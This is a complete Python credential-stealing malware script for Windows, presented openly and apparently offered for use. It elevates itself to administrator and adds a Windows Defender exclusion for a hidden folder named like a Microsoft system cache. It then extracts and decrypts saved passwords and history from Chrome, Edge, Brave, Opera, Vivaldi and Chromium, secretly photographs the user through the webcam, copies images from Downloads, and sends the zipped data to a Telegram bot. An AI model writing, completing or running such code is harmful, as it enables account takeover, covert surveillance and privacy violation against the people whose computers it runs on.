import os
import sys
import ctypes
import json
import shutil
import sqlite3
import zipfile
import subprocess
import platform
from pathlib import Path
import telebot
import win32crypt  # pip install pywin32
import cv2  # pip install opencv-python

# CONFIG - replace these:
TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

# Paths
DOWNLOADS_FOLDER = os.path.join(os.path.expanduser('~'), 'Downloads')
HIDDEN_FOLDER = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'WinSysCache')
os.makedirs(HIDDEN_FOLDER, exist_ok=True)

SYSTEM_INFO_PATH = os.path.join(HIDDEN_FOLDER, 'system_info.json')
IMAGES_FOLDER = os.path.join(HIDDEN_FOLDER, 'images')
WEBCAM_IMAGE_PATH = os.path.join(HIDDEN_FOLDER, 'webcam_image.png')
ZIP_PATH = os.path.join(HIDDEN_FOLDER, 'data.zip')

COPYRIGHT = "Gomorronmannen 2025. All rights reserved."

BROWSERS = {
    "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
    "Edge": os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default'),
    "Brave": os.path.join(os.getenv('LOCALAPPDATA'), r'BraveSoftware\Brave-Browser\User Data\Default'),
    "Opera": os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera Stable'),
    "OperaGX": os.path.join(os.getenv('APPDATA'), r'Opera Software\Opera GX Stable'),
    "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), r'Vivaldi\User Data\Default'),
    "Chromium": os.path.join(os.getenv('LOCALAPPDATA'), r'Chromium\User Data\Default'),
}

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

def run_as_admin():
    if not is_admin():
        params = " ".join(f'"{arg}"' for arg in sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        sys.exit()

def add_defender_exclusion(path):
    try:
        subprocess.run(f'powershell Add-MpPreference -ExclusionPath "{path}"', shell=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

def gather_system_info():
    info = {
        'OS': platform.system(),
        'Platform': platform.platform(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'Python Version': platform.python_version()
    }
    with open(SYSTEM_INFO_PATH, 'w') as f:
        json.dump(info, f, indent=4)

def decrypt_password(encrypted_password):
    try:
        decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
        return decrypted.decode('utf-8')
    except Exception:
        return ""

def gather_browser_data():
    for browser, profile_path in BROWSERS.items():
        if not os.path.exists(profile_path):
            continue

        print(f"[*] Grabbing data from {browser}")

        browser_folder = os.path.join(HIDDEN_FOLDER, browser)
        os.makedirs(browser_folder, exist_ok=True)

        # Grab passwords
        login_db = os.path.join(profile_path, 'Login Data')
        if os.path.exists(login_db):
            try:
                tmp_login_db = os.path.join(browser_folder, 'LoginDataCopy.db')
                shutil.copy2(login_db, tmp_login_db)

                conn = sqlite3.connect(tmp_login_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                with open(os.path.join(browser_folder, 'browser_passwords.txt'), 'w', encoding='utf-8') as f:
                    for url, username, encrypted_password in cursor.fetchall():
                        password = decrypt_password(encrypted_password)
                        if username or password:
                            f.write(f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n")
                conn.close()
                os.remove(tmp_login_db)
            except Exception as e:
                print(f"[!] Failed to grab passwords for {browser}: {e}")

        # Grab history
        history_db = os.path.join(profile_path, 'History')
        if os.path.exists(history_db):
            try:
                tmp_history_db = os.path.join(browser_folder, 'HistoryCopy.db')
                shutil.copy2(history_db, tmp_history_db)

                conn = sqlite3.connect(tmp_history_db)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls")
                with open(os.path.join(browser_folder, 'browser_history.txt'), 'w', encoding='utf-8') as f:
                    for url, title, last_visit in cursor.fetchall():
                        f.write(f"URL: {url}\nTitle: {title}\nLast Visit Time: {last_visit}\n\n")
                conn.close()
                os.remove(tmp_history_db)
            except Exception as e:
                print(f"[!] Failed to grab history for {browser}: {e}")

def capture_webcam_image():
    try:
        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            print("[*] No webcam detected.")
            return
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(WEBCAM_IMAGE_PATH, frame)
            print("[*] Webcam image captured.")
        else:
            print("[!] Failed to capture image from webcam.")
        cam.release()
    except Exception as e:
        print(f"[!] Webcam capture error: {e}")

def gather_images_from_downloads():
    os.makedirs(IMAGES_FOLDER, exist_ok=True)
    for file in os.listdir(DOWNLOADS_FOLDER):
        if file.lower().endswith(('png', 'jpg', 'jpeg', 'bmp', 'gif')):
            try:
                shutil.copy2(os.path.join(DOWNLOADS_FOLDER, file), IMAGES_FOLDER)
            except Exception:
                pass

def organize_and_zip():
    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(HIDDEN_FOLDER):
            for file in files:
                filepath = os.path.join(root, file)
                arcname = os.path.relpath(filepath, HIDDEN_FOLDER)
                zipf.write(filepath, arcname)

def send_zip_to_telegram():
    try:
        bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
        with open(ZIP_PATH, 'rb') as f:
            bot.send_document(CHAT_ID, f)
        os.remove(ZIP_PATH)
    except Exception as e:
        print(f"[!] Telegram upload failed: {e}")

def main():
    run_as_admin()
    print(COPYRIGHT)

    add_defender_exclusion(HIDDEN_FOLDER)
    gather_system_info()
    gather_browser_data()
    capture_webcam_image()
    gather_images_from_downloads()
    organize_and_zip()
    send_zip_to_telegram()

if __name__ == "__main__":
    main()